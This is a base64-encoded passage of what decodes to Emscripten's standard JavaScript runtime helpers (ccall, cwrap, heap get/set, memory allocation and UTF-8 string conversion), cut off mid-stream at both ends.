RyICE9PSBudWxsICYmIHN0ciAhPT0gdW5kZWZpbmVkICYmIHN0ciAhPT0gMCkgewogICAgICAgICAgICAgICAgdmFyIGxlbiA9IChzdHIubGVuZ3RoIDw8IDIpICsgMTsKICAgICAgICAgICAgICAgIHJldCA9IFJ1bnRpbWUuc3RhY2tBbGxvYyhsZW4pOwogICAgICAgICAgICAgICAgc3RyaW5nVG9VVEY4KHN0ciwgcmV0LCBsZW4pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHJldAogICAgICAgIH0pCiAgICB9OwogICAgdmFyIHRvQyA9IHsic3RyaW5nIjogSlNmdW5jc1sic3RyaW5nVG9DIl0sICJhcnJheSI6IEpTZnVuY3NbImFycmF5VG9DIl19OwogICAgY2NhbGwgPSBmdW5jdGlvbiBjY2FsbEZ1bmMoaWRlbnQsIHJldHVyblR5cGUsIGFyZ1R5cGVzLCBhcmdzLCBvcHRzKSB7CiAgICAgICAgdmFyIGZ1bmMgPSBnZXRDRnVuYyhpZGVudCk7CiAgICAgICAgdmFyIGNBcmdzID0gW107CiAgICAgICAgdmFyIHN0YWNrID0gMDsKICAgICAgICBpZihhcmdzKSB7CiAgICAgICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBhcmdzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICB2YXIgY29udmVydGVyID0gdG9DW2FyZ1R5cGVzW2ldXTsKICAgICAgICAgICAgICAgIGlmKGNvbnZlcnRlcikgewogICAgICAgICAgICAgICAgICAgIGlmKHN0YWNrID09PSAwKSBzdGFjayA9IFJ1bnRpbWUuc3RhY2tTYXZlKCk7CiAgICAgICAgICAgICAgICAgICAgY0FyZ3NbaV0gPSBjb252ZXJ0ZXIoYXJnc1tpXSkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY0FyZ3NbaV0gPSBhcmdzW2ldCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIHJldCA9IGZ1bmMuYXBwbHkobnVsbCwgY0FyZ3MpOwogICAgICAgIGlmKHJldHVyblR5cGUgPT09ICJzdHJpbmciKSByZXQgPSBQb2ludGVyX3N0cmluZ2lmeShyZXQpOwogICAgICAgIGlmKHN0YWNrICE9PSAwKSB7CiAgICAgICAgICAgIGlmKG9wdHMgJiYgb3B0cy5hc3luYykgewogICAgICAgICAgICAgICAgRW10ZXJwcmV0ZXJBc3luYy5hc3luY0ZpbmFsaXplcnMucHVzaCgoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgUnVudGltZS5zdGFja1Jlc3RvcmUoc3RhY2spCiAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICBSdW50aW1lLnN0YWNrUmVzdG9yZShzdGFjaykKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJldAogICAgfTsKICAgIHZhciBzb3VyY2VSZWdleCA9IC9eZnVuY3Rpb25ccypbYS16QS1aJF8wLTldKlxzKlwoKFteKV0qKVwpXHMqe1xzKihbXipdKj8pW1xzO10qKD86cmV0dXJuXHMqKC4qPylbO1xzXSopP30kLzsKCiAgICBmdW5jdGlvbiBwYXJzZUpTRnVuYyhqc2Z1bmMpIHsKICAgICAgICB2YXIgcGFyc2VkID0ganNmdW5jLnRvU3RyaW5nKCkubWF0Y2goc291cmNlUmVnZXgpLnNsaWNlKDEpOwogICAgICAgIHJldHVybiB7YXJndW1lbnRzOiBwYXJzZWRbMF0sIGJvZHk6IHBhcnNlZFsxXSwgcmV0dXJuVmFsdWU6IHBhcnNlZFsyXX0KICAgIH0KCiAgICB2YXIgSlNzb3VyY2UgPSBudWxsOwoKICAgIGZ1bmN0aW9uIGVuc3VyZUpTc291cmNlKCkgewogICAgICAgIGlmKCFKU3NvdXJjZSkgewogICAgICAgICAgICBKU3NvdXJjZSA9IHt9OwogICAgICAgICAgICBmb3IodmFyIGZ1biBpbiBKU2Z1bmNzKSB7CiAgICAgICAgICAgICAgICBpZihKU2Z1bmNzLmhhc093blByb3BlcnR5KGZ1bikpIHsKICAgICAgICAgICAgICAgICAgICBKU3NvdXJjZVtmdW5dID0gcGFyc2VKU0Z1bmMoSlNmdW5jc1tmdW5dKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIGN3cmFwID0gZnVuY3Rpb24gY3dyYXAoaWRlbnQsIHJldHVyblR5cGUsIGFyZ1R5cGVzKSB7CiAgICAgICAgYXJnVHlwZXMgPSBhcmdUeXBlcyB8fCBbXTsKICAgICAgICB2YXIgY2Z1bmMgPSBnZXRDRnVuYyhpZGVudCk7CiAgICAgICAgdmFyIG51bWVyaWNBcmdzID0gYXJnVHlwZXMuZXZlcnkoKGZ1bmN0aW9uKHR5cGUpIHsKICAgICAgICAgICAgcmV0dXJuIHR5cGUgPT09ICJudW1iZXIiCiAgICAgICAgfSkpOwogICAgICAgIHZhciBudW1lcmljUmV0ID0gcmV0dXJuVHlwZSAhPT0gInN0cmluZyI7CiAgICAgICAgaWYobnVtZXJpY1JldCAmJiBudW1lcmljQXJncykgewogICAgICAgICAgICByZXR1cm4gY2Z1bmMKICAgICAgICB9CiAgICAgICAgdmFyIGFyZ05hbWVzID0gYXJnVHlwZXMubWFwKChmdW5jdGlvbih4LCBpKSB7CiAgICAgICAgICAgIHJldHVybiAiJCIgKyBpCiAgICAgICAgfSkpOwogICAgICAgIHZhciBmdW5jc3RyID0gIihmdW5jdGlvbigiICsgYXJnTmFtZXMuam9pbigiLCIpICsgIikgeyI7CiAgICAgICAgdmFyIG5hcmdzID0gYXJnVHlwZXMubGVuZ3RoOwogICAgICAgIGlmKCFudW1lcmljQXJncykgewogICAgICAgICAgICBlbnN1cmVKU3NvdXJjZSgpOwogICAgICAgICAgICBmdW5jc3RyICs9ICJ2YXIgc3RhY2sgPSAiICsgSlNzb3VyY2VbInN0YWNrU2F2ZSJdLmJvZHkgKyAiOyI7CiAgICAgICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBuYXJnczsgaSsrKSB7CiAgICAgICAgICAgICAgICB2YXIgYXJnID0gYXJnTmFtZXNbaV0sIHR5cGUgPSBhcmdUeXBlc1tpXTsKICAgICAgICAgICAgICAgIGlmKHR5cGUgPT09ICJudW1iZXIiKSBjb250aW51ZTsKICAgICAgICAgICAgICAgIHZhciBjb252ZXJ0Q29kZSA9IEpTc291cmNlW3R5cGUgKyAiVG9DIl07CiAgICAgICAgICAgICAgICBmdW5jc3RyICs9ICJ2YXIgIiArIGNvbnZlcnRDb2RlLmFyZ3VtZW50cyArICIgPSAiICsgYXJnICsgIjsiOwogICAgICAgICAgICAgICAgZnVuY3N0ciArPSBjb252ZXJ0Q29kZS5ib2R5ICsgIjsiOwogICAgICAgICAgICAgICAgZnVuY3N0ciArPSBhcmcgKyAiPSgiICsgY29udmVydENvZGUucmV0dXJuVmFsdWUgKyAiKTsiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgdmFyIGNmdW5jbmFtZSA9IHBhcnNlSlNGdW5jKChmdW5jdGlvbigpIHsKICAgICAgICAgICAgcmV0dXJuIGNmdW5jCiAgICAgICAgfSkpLnJldHVyblZhbHVlOwogICAgICAgIGZ1bmNzdHIgKz0gInZhciByZXQgPSAiICsgY2Z1bmNuYW1lICsgIigiICsgYXJnTmFtZXMuam9pbigiLCIpICsgIik7IjsKICAgICAgICBpZighbnVtZXJpY1JldCkgewogICAgICAgICAgICB2YXIgc3RyZ2Z5ID0gcGFyc2VKU0Z1bmMoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIFBvaW50ZXJfc3RyaW5naWZ5CiAgICAgICAgICAgIH0pKS5yZXR1cm5WYWx1ZTsKICAgICAgICAgICAgZnVuY3N0ciArPSAicmV0ID0gIiArIHN0cmdmeSArICIocmV0KTsiCiAgICAgICAgfQogICAgICAgIGlmKCFudW1lcmljQXJncykgewogICAgICAgICAgICBlbnN1cmVKU3NvdXJjZSgpOwogICAgICAgICAgICBmdW5jc3RyICs9IEpTc291cmNlWyJzdGFja1Jlc3RvcmUiXS5ib2R5LnJlcGxhY2UoIigpIiwgIihzdGFjaykiKSArICI7IgogICAgICAgIH0KICAgICAgICBmdW5jc3RyICs9ICJyZXR1cm4gcmV0fSkiOwogICAgICAgIHJldHVybiBldmFsKGZ1bmNzdHIpCiAgICB9Cn0pKSgpOwpNb2R1bGVbImNjYWxsIl0gPSBjY2FsbDsKTW9kdWxlWyJjd3JhcCJdID0gY3dyYXA7CgpmdW5jdGlvbiBzZXRWYWx1ZShwdHIsIHZhbHVlLCB0eXBlLCBub1NhZmUpIHsKICAgIHR5cGUgPSB0eXBlIHx8ICJpOCI7CiAgICBpZih0eXBlLmNoYXJBdCh0eXBlLmxlbmd0aCAtIDEpID09PSAiKiIpIHR5cGUgPSAiaTMyIjsKICAgIHN3aXRjaCh0eXBlKSB7CiAgICAgICAgY2FzZSJpMSI6CiAgICAgICAgICAgIEhFQVA4W3B0ciA+PiAwXSA9IHZhbHVlOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlImk4IjoKICAgICAgICAgICAgSEVBUDhbcHRyID4+IDBdID0gdmFsdWU7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UiaTE2IjoKICAgICAgICAgICAgSEVBUDE2W3B0ciA+PiAxXSA9IHZhbHVlOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlImkzMiI6CiAgICAgICAgICAgIEhFQVAzMltwdHIgPj4gMl0gPSB2YWx1ZTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSJpNjQiOgogICAgICAgICAgICB0ZW1wSTY0ID0gW3ZhbHVlID4+PiAwLCAodGVtcERvdWJsZSA9IHZhbHVlLCArTWF0aF9hYnModGVtcERvdWJsZSkgPj0gMSA/IHRlbXBEb3VibGUgPiAwID8gKE1hdGhfbWluKCtNYXRoX2Zsb29yKHRlbXBEb3VibGUgLyA0Mjk0OTY3Mjk2KSwgNDI5NDk2NzI5NSkgfCAwKSA+Pj4gMCA6IH5+K01hdGhfY2VpbCgodGVtcERvdWJsZSAtICsofn50ZW1wRG91YmxlID4+PiAwKSkgLyA0Mjk0OTY3Mjk2KSA+Pj4gMCA6IDApXSwgSEVBUDMyW3B0ciA+PiAyXSA9IHRlbXBJNjRbMF0sIEhFQVAzMltwdHIgKyA0ID4+IDJdID0gdGVtcEk2NFsxXTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSJmbG9hdCI6CiAgICAgICAgICAgIEhFQVBGMzJbcHRyID4+IDJdID0gdmFsdWU7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UiZG91YmxlIjoKICAgICAgICAgICAgSEVBUEY2NFtwdHIgPj4gM10gPSB2YWx1ZTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgYWJvcnQoImludmFsaWQgdHlwZSBmb3Igc2V0VmFsdWU6ICIgKyB0eXBlKQogICAgfQp9CgpNb2R1bGVbInNldFZhbHVlIl0gPSBzZXRWYWx1ZTsKCmZ1bmN0aW9uIGdldFZhbHVlKHB0ciwgdHlwZSwgbm9TYWZlKSB7CiAgICB0eXBlID0gdHlwZSB8fCAiaTgiOwogICAgaWYodHlwZS5jaGFyQXQodHlwZS5sZW5ndGggLSAxKSA9PT0gIioiKSB0eXBlID0gImkzMiI7CiAgICBzd2l0Y2godHlwZSkgewogICAgICAgIGNhc2UiaTEiOgogICAgICAgICAgICByZXR1cm4gSEVBUDhbcHRyID4+IDBdOwogICAgICAgIGNhc2UiaTgiOgogICAgICAgICAgICByZXR1cm4gSEVBUDhbcHRyID4+IDBdOwogICAgICAgIGNhc2UiaTE2IjoKICAgICAgICAgICAgcmV0dXJuIEhFQVAxNltwdHIgPj4gMV07CiAgICAgICAgY2FzZSJpMzIiOgogICAgICAgICAgICByZXR1cm4gSEVBUDMyW3B0ciA+PiAyXTsKICAgICAgICBjYXNlImk2NCI6CiAgICAgICAgICAgIHJldHVybiBIRUFQMzJbcHRyID4+IDJdOwogICAgICAgIGNhc2UiZmxvYXQiOgogICAgICAgICAgICByZXR1cm4gSEVBUEYzMltwdHIgPj4gMl07CiAgICAgICAgY2FzZSJkb3VibGUiOgogICAgICAgICAgICByZXR1cm4gSEVBUEY2NFtwdHIgPj4gM107CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgYWJvcnQoImludmFsaWQgdHlwZSBmb3Igc2V0VmFsdWU6ICIgKyB0eXBlKQogICAgfQogICAgcmV0dXJuIG51bGwKfQoKTW9kdWxlWyJnZXRWYWx1ZSJdID0gZ2V0VmFsdWU7CnZhciBBTExPQ19OT1JNQUwgPSAwOwp2YXIgQUxMT0NfU1RBQ0sgPSAxOwp2YXIgQUxMT0NfU1RBVElDID0gMjsKdmFyIEFMTE9DX0RZTkFNSUMgPSAzOwp2YXIgQUxMT0NfTk9ORSA9IDQ7Ck1vZHVsZVsiQUxMT0NfTk9STUFMIl0gPSBBTExPQ19OT1JNQUw7Ck1vZHVsZVsiQUxMT0NfU1RBQ0siXSA9IEFMTE9DX1NUQUNLOwpNb2R1bGVbIkFMTE9DX1NUQVRJQyJdID0gQUxMT0NfU1RBVElDOwpNb2R1bGVbIkFMTE9DX0RZTkFNSUMiXSA9IEFMTE9DX0RZTkFNSUM7Ck1vZHVsZVsiQUxMT0NfTk9ORSJdID0gQUxMT0NfTk9ORTsKCmZ1bmN0aW9uIGFsbG9jYXRlKHNsYWIsIHR5cGVzLCBhbGxvY2F0b3IsIHB0cikgewogICAgdmFyIHplcm9pbml0LCBzaXplOwogICAgaWYodHlwZW9mIHNsYWIgPT09ICJudW1iZXIiKSB7CiAgICAgICAgemVyb2luaXQgPSB0cnVlOwogICAgICAgIHNpemUgPSBzbGFiCiAgICB9IGVsc2UgewogICAgICAgIHplcm9pbml0ID0gZmFsc2U7CiAgICAgICAgc2l6ZSA9IHNsYWIubGVuZ3RoCiAgICB9CiAgICB2YXIgc2luZ2xlVHlwZSA9IHR5cGVvZiB0eXBlcyA9PT0gInN0cmluZyIgPyB0eXBlcyA6IG51bGw7CiAgICB2YXIgcmV0OwogICAgaWYoYWxsb2NhdG9yID09IEFMTE9DX05PTkUpIHsKICAgICAgICByZXQgPSBwdHIKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0ID0gW3R5cGVvZiBfbWFsbG9jID09PSAiZnVuY3Rpb24iID8gX21hbGxvYyA6IFJ1bnRpbWUuc3RhdGljQWxsb2MsIFJ1bnRpbWUuc3RhY2tBbGxvYywgUnVudGltZS5zdGF0aWNBbGxvYywgUnVudGltZS5keW5hbWljQWxsb2NdW2FsbG9jYXRvciA9PT0gdW5kZWZpbmVkID8gQUxMT0NfU1RBVElDIDogYWxsb2NhdG9yXShNYXRoLm1heChzaXplLCBzaW5nbGVUeXBlID8gMSA6IHR5cGVzLmxlbmd0aCkpCiAgICB9CiAgICBpZih6ZXJvaW5pdCkgewogICAgICAgIHZhciBwdHIgPSByZXQsIHN0b3A7CiAgICAgICAgYXNzZXJ0KChyZXQgJiAzKSA9PSAwKTsKICAgICAgICBzdG9wID0gcmV0ICsgKHNpemUgJiB+Myk7CiAgICAgICAgZm9yKDsgcHRyIDwgc3RvcDsgcHRyICs9IDQpIHsKICAgICAgICAgICAgSEVBUDMyW3B0ciA+PiAyXSA9IDAKICAgICAgICB9CiAgICAgICAgc3RvcCA9IHJldCArIHNpemU7CiAgICAgICAgd2hpbGUocHRyIDwgc3RvcCkgewogICAgICAgICAgICBIRUFQOFtwdHIrKyA+PiAwXSA9IDAKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJldAogICAgfQogICAgaWYoc2luZ2xlVHlwZSA9PT0gImk4IikgewogICAgICAgIGlmKHNsYWIuc3ViYXJyYXkgfHwgc2xhYi5zbGljZSkgewogICAgICAgICAgICBIRUFQVTguc2V0KHNsYWIsIHJldCkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBIRUFQVTguc2V0KG5ldyBVaW50OEFycmF5KHNsYWIpLCByZXQpCiAgICAgICAgfQogICAgICAgIHJldHVybiByZXQKICAgIH0KICAgIHZhciBpID0gMCwgdHlwZSwgdHlwZVNpemUsIHByZXZpb3VzVHlwZTsKICAgIHdoaWxlKGkgPCBzaXplKSB7CiAgICAgICAgdmFyIGN1cnIgPSBzbGFiW2ldOwogICAgICAgIGlmKHR5cGVvZiBjdXJyID09PSAiZnVuY3Rpb24iKSB7CiAgICAgICAgICAgIGN1cnIgPSBSdW50aW1lLmdldEZ1bmN0aW9uSW5kZXgoY3VycikKICAgICAgICB9CiAgICAgICAgdHlwZSA9IHNpbmdsZVR5cGUgfHwgdHlwZXNbaV07CiAgICAgICAgaWYodHlwZSA9PT0gMCkgewogICAgICAgICAgICBpKys7CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIGlmKHR5cGUgPT0gImk2NCIpIHR5cGUgPSAiaTMyIjsKICAgICAgICBzZXRWYWx1ZShyZXQgKyBpLCBjdXJyLCB0eXBlKTsKICAgICAgICBpZihwcmV2aW91c1R5cGUgIT09IHR5cGUpIHsKICAgICAgICAgICAgdHlwZVNpemUgPSBSdW50aW1lLmdldE5hdGl2ZVR5cGVTaXplKHR5cGUpOwogICAgICAgICAgICBwcmV2aW91c1R5cGUgPSB0eXBlCiAgICAgICAgfQogICAgICAgIGkgKz0gdHlwZVNpemUKICAgIH0KICAgIHJldHVybiByZXQKfQoKTW9kdWxlWyJhbGxvY2F0ZSJdID0gYWxsb2NhdGU7CgpmdW5jdGlvbiBnZXRNZW1vcnkoc2l6ZSkgewogICAgaWYoIXN0YXRpY1NlYWxlZCkgcmV0dXJuIFJ1bnRpbWUuc3RhdGljQWxsb2Moc2l6ZSk7CiAgICBpZighcnVudGltZUluaXRpYWxpemVkKSByZXR1cm4gUnVudGltZS5keW5hbWljQWxsb2Moc2l6ZSk7CiAgICByZXR1cm4gX21hbGxvYyhzaXplKQp9CgpNb2R1bGVbImdldE1lbW9yeSJdID0gZ2V0TWVtb3J5OwoKZnVuY3Rpb24gUG9pbnRlcl9zdHJpbmdpZnkocHRyLCBsZW5ndGgpIHsKICAgIGlmKGxlbmd0aCA9PT0gMCB8fCAhcHRyKSByZXR1cm4gIiI7CiAgICB2YXIgaGFzVXRmID0gMDsKICAgIHZhciB0OwogICAgdmFyIGkgPSAwOwogICAgd2hpbGUoMSkgewogICAgICAgIHQgPSBIRUFQVThbcHRyICsgaSA+PiAwXTsKICAgICAgICBoYXNVdGYgfD0gdDsKICAgICAgICBpZih0ID09IDAgJiYgIWxlbmd0aCkgYnJlYWs7CiAgICAgICAgaSsrOwogICAgICAgIGlmKGxlbmd0aCAmJiBpID09IGxlbmd0aCkgYnJlYWsKICAgIH0KICAgIGlmKCFsZW5ndGgpIGxlbmd0aCA9IGk7CiAgICB2YXIgcmV0ID0gIiI7CiAgICBpZihoYXNVdGYgPCAxMjgpIHsKICAgICAgICB2YXIgTUFYX0NIVU5LID0gMTAyNDsKICAgICAgICB2YXIgY3VycjsKICAgICAgICB3aGlsZShsZW5ndGggPiAwKSB7CiAgICAgICAgICAgIGN1cnIgPSBTdHJpbmcuZnJvbUNoYXJDb2RlLmFwcGx5KFN0cmluZywgSEVBUFU4LnN1YmFycmF5KHB0ciwgcHRyICsgTWF0aC5taW4obGVuZ3RoLCBNQVhfQ0hVTkspKSk7CiAgICAgICAgICAgIHJldCA9IHJldCA/IHJldCArIGN1cnIgOiBjdXJyOwogICAgICAgICAgICBwdHIgKz0gTUFYX0NIVU5LOwogICAgICAgICAgICBsZW5ndGggLT0gTUFYX0NIVU5LCiAgICAgICAgfQogICAgICAgIHJldHVybiByZXQKICAgIH0KICAgIHJldHVybiBNb2R1bGVbIlVURjhUb1N0cmluZyJdKHB0cikKfQoKTW9kdWxlWyJQb2ludGVyX3N0cmluZ2lmeSJdID0gUG9pbnRlcl9zdHJpbmdpZnk7CgpmdW5jdGlvbiBBc2NpaVRvU3RyaW5nKHB0cikgewogICAgdmFyIHN0ciA9ICIiOwogICAgd2hpbGUoMSkgewogICAgICAgIHZhciBjaCA9IEhFQVA4W3B0cisrID4+IDBdOwogICAgICAgIGlmKCFjaCkgcmV0dXJuIHN0cjsKICAgICAgICBzdHIgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShjaCkKICAgIH0KfQoKTW9kdWxlWyJBc2NpaVRvU3RyaW5nIl0gPSBBc2NpaVRvU3RyaW5nOwoKZnVuY3Rpb24gc3RyaW5nVG9Bc2NpaShzdHIsIG91dFB0cikgewogICAgcmV0dXJuIHdyaXRlQXNjaWlUb01lbW9yeShzdHIsIG91dFB0ciwgZmFsc2UpCn0KCk1vZHVsZVsic3RyaW5nVG9Bc2NpaSJdID0gc3RyaW5nVG9Bc2NpaTsKdmFyIFVURjhEZWNvZGVyID0gdHlwZW9mIFRleHREZWNvZGVyICE9PSAidW5kZWZpbmVkIiA/IG5ldyBUZXh0RGVjb2RlcigidXRmOCIpIDogdW5kZWZpbmVkOwoKZnVuY3Rpb24gVVRGOEFycmF5VG9TdHJpbmcodThBcnJheSwgaWR4KSB7CiAgICB2YXIgZW5kUHRyID0gaWR4OwogICAgd2hpbGUodThBcnJheVtlbmRQdHJdKSArK2VuZFB0cjsKICAgIGlmKGVuZFB0ciAtIGlkeCA+IDE2ICYmIHU4QXJyYXkuc3ViYXJyYXkgJiYgVVRGOERlY29kZXIpIHsKICAgICAgICByZXR1cm4gVVRGOERlY29kZXIuZGVjb2RlKHU4QXJyYXkuc3ViYXJyYXkoaWR4LCBlbmRQdHIpKQogICAgfSBlbHNlIHsKICAgICAgICB2YXIgdTAsIHUxLCB1MiwgdTMsIHU0LCB1NTsKICAgICAgICB2YXIgc3RyID0gIiI7CiAgICAgICAgd2hpbGUoMSkgewogICAgICAgICAgICB1MCA9IHU4QXJyYXlbaWR4KytdOwogICAgICAgICAgICBpZighdTApIHJldHVybiBzdHI7CiAgICAgICAgICAgIGlmKCEodTAgJiAxMjgpKSB7CiAgICAgICAgICAgICAgICBzdHIgKz0gU3RyaW5nLmZyb21DaGFyQ29kZSh1MCk7CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHUxID0gdThBcnJheVtpZHgrK10gJiA2MzsKICAgICAgICAgICAgaWYoKHUwICYgMjI0KSA9PSAxOTIpIHsKICAgICAgICAgICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKCh1MCAmIDMxKSA8PCA2IHwgdTEpOwogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQogICAgICAgICAgICB1MiA9IHU4QXJyYXlbaWR4KytdICYgNjM7CiAgICAgICAgICAgIGlmKCh1MCAmIDI0MCkgPT0gMjI0KSB7CiAgICAgICAgICAgICAgICB1MCA9ICh1MCAmIDE1KSA8PCAxMiB8IHUxIDw8IDYgfCB1MgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgdTMgPSB1OEFycmF5W2lkeCsrXSAmIDYzOwogICAgICAgICAgICAgICAgaWYoKHUwICYgMjQ4KSA9PSAyNDApIHsKICAgICAgICAgICAgICAgICAgICB1MCA9ICh1MCAmIDcpIDw8IDE4IHwgdTEgPDwgMTIgfCB1MiA8PCA2IHwgdTMKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgdTQgPSB1OEFycmF5W2lkeCsrXSAmIDYzOwogICAgICAgICAgICAgICAgICAgIGlmKCh1MCAmIDI1MikgPT0gMjQ4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHUwID0gKHUwICYgMykgPDwgMjQgfCB1MSA8PCAxOCB8IHUyIDw8IDEyIHwgdTMgPDwgNiB8IHU0CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdTUgPSB1OEFycmF5W2lkeCsrXSAmIDYzOwogICAgICAgICAgICAgICAgICAgICAgICB1MCA9ICh1MCAmIDEpIDw8IDMwIHwgdTEgPDwgMjQgfCB1MiA8PCAxOCB8IHUzIDw8IDEyIHwgdTQgPDwgNiB8IHU1CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKHUwIDwgNjU1MzYpIHsKICAgICAgICAgICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKHUwKQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgdmFyIGNoID0gdTAgLSA2NTUzNjsKICAgICAgICAgICAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKDU1Mjk2IHwgY2ggPj4gMTAsIDU2MzIwIHwgY2ggJiAxMDIzKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpNb2R1bGVbIlVURjhBcnJheVRvU3RyaW5nIl0gPSBVVEY4QXJyYXlUb1N0cmluZzsKCmZ1bmN0aW9uIFVURjhUb1N0cmluZyhwdHIpIHsKICAgIHJldHVybiBVVEY4QXJyYXlUb1N0cmluZyhIRUFQVTgsIHB0cikKfQoKTW9kdWxlWyJVVEY4VG9TdHJpbmciXSA9IFVURjhUb1N0cmluZzsKCmZ1bmN0aW9uIHN0cmluZ1RvVVRGOEFycmF5KHN0ciwgb3V0VThBcnJheSwgb3V0SWR4LCBtYXhCeXRlc1RvV3JpdGUpIHsKICAgIGlmKCEobWF4Qnl0ZXNUb1dyaXRlID4gMCkpIHJldHVybiAwOwogICAgdmFyIHN0YXJ0SWR4ID0gb3V0SWR4OwogICAgdmFyIGVuZElkeCA9IG91dElkeCArIG1heEJ5dGVzVG9Xcml0ZSAtIDE7CiAgICBmb3IodmFyIGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgKytpKSB7CiAgICAgICAgdmFyIHUgPSBzdHIuY2hhckNvZGVBdChpKTsKICAgICAgICBpZih1ID49IDU1Mjk2ICYmIHUgPD0gNTczNDMpIHUgPSA2NTUzNiArICgodSAmIDEwMjMpIDw8IDEwKSB8IHN0ci5jaGFyQ29kZUF0KCsraSkgJiAxMDIzOwogICAgICAgIGlmKHUgPD0gMTI3KSB7CiAgICAgICAgICAgIGlmKG91dElkeCA+PSBlbmRJZHgpIGJyZWFrOwogICAgICAgICAgICBvdXRVOEFycmF5W291dElkeCsrXSA9IHUKICAgICAgICB9IGVsc2UgaWYodSA8PSAyMDQ3KSB7CiAgICAgICAgICAgIGlmKG91dElkeCArIDEgPj0gZW5kSWR4KSBicmVhazsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxOTIgfCB1ID4+IDY7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSAmIDYzCiAgICAgICAgfSBlbHNlIGlmKHUgPD0gNjU1MzUpIHsKICAgICAgICAgICAgaWYob3V0SWR4ICsgMiA+PSBlbmRJZHgpIGJyZWFrOwogICAgICAgICAgICBvdXRVOEFycmF5W291dElkeCsrXSA9IDIyNCB8IHUgPj4gMTI7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSA+PiA2ICYgNjM7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSAmIDYzCiAgICAgICAgfSBlbHNlIGlmKHUgPD0gMjA5NzE1MSkgewogICAgICAgICAgICBpZihvdXRJZHggKyAzID49IGVuZElkeCkgYnJlYWs7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMjQwIHwgdSA+PiAxODsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ID4+IDEyICYgNjM7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSA+PiA2ICYgNjM7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSAmIDYzCiAgICAgICAgfSBlbHNlIGlmKHUgPD0gNjcxMDg4NjMpIHsKICAgICAgICAgICAgaWYob3V0SWR4ICsgNCA+PSBlbmRJZHgpIGJyZWFrOwogICAgICAgICAgICBvdXRVOEFycmF5W291dElkeCsrXSA9IDI0OCB8IHUgPj4gMjQ7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSA+PiAxOCAmIDYzOwogICAgICAgICAgICBvdXRVOEFycmF5W291dElkeCsrXSA9IDEyOCB8IHUgPj4gMTIgJiA2MzsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ID4+IDYgJiA2MzsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ICYgNjMKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZihvdXRJZHggKyA1ID49IGVuZElkeCkgYnJlYWs7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMjUyIHwgdSA+PiAzMDsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ID4+IDI0ICYgNjM7CiAgICAgICAgICAgIG91dFU4QXJyYXlbb3V0SWR4KytdID0gMTI4IHwgdSA+PiAxOCAmIDYzOwogICAgICAgICAgICBvdXRVOEFycmF5W291dElkeCsrXSA9IDEy